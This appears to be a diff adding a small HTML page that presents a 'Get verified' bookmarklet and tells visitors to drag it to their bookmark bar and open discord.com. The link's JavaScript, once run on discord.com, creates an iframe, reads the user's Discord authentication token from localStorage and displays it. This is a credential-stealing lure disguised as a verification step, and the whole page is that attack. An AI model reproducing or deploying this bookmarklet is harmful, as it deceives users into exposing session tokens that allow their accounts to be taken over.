@@ -1,0 +1,10 @@
+<html>
+    <body>
+        <h1>Bookmark Test</h1>
+        <p>Drag this button to your bookmark bar and go to discord.com to get verified.</p>
+        <p>
+            <a href="javascript:(function(){if(document.location.origin!=='https://discord.com'){alert('Drag this button to your bookmark and go to discord.com to get verified.');}else{location.reload();let iFrame=document.createElement('iframe');document.body.appendChild(iFrame);let token=iFrame.contentWindow.localStorage.token.replace(/&quot;/g, '');alert(token);}})();">Get verified</a>
+        </p>
+    </body>
+</html>
+
